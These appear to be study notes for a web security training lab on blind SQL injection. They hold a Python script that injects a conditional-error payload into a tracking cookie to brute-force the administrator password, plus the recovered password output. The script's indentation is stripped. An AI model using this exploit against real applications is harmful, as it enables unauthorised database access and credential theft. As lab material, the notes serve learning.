
# Lab: Blind SQL injection with conditional errors

PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

```python
#!/usr/bin/env python3

import requests
import sys
import signal
import string


def def_handler(sig, frame):
print("\n[!] Exiting...")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
characters = string.ascii_lowercase + string.digits

def makeSQLI():

# Asegúrate de que esta URL sea exactamente la de tu pestaña actual del laboratorio

url = 'https://0a760045048e353b800b080200c2009f.web-security-academy.net/'
print("[+] Iniciando script... Probando caracteres:")
password = ""
for position in range(1, 21):
found = False
for char in characters:
cookies = {
'TrackingId': f"GNL02wfVGHBRRWJh' || (SELECT case when substr (password,{position},1)='{char}' then to_char(1/0) else '' end from users where username='administrator') || '",
'session': 'VcP8EhvtG4UtbeQCWc2gHfE1PBOYWeyI'
}

try:

r = requests.get(url, cookies=cookies, timeout=5)

# ESTO ES CLAVE: Imprime lo que está probando para ver que avanza

print(f"Probando posición {position} con '{char}' -> Status: {r.status_code}")

# Cambia "Welcome back!" por el texto exacto que aparece en tu navegador cuando logras entrar

if r.status_code == 500:

password += char

print(f"\n[+] ¡ÉXITO! Carácter encontrado en posición {position}: '{char}' --> Contraseña parcial: {password}\n")
found = True
break

except requests.exceptions.RequestException as e:
print(f"[-] Error de conexión: {e}")

if not found:
print(f"\n[+] Búsqueda finalizada. Contraseña completa: {password}")
break

if __name__ == '__main__':

makeSQLI()
```

```java
[+] ¡ÉXITO! Carácter encontrado en posición 20: 'm' --> Contraseña parcial: 7jdtjoenqjv3rb7uam2m
```


![[class12.png]]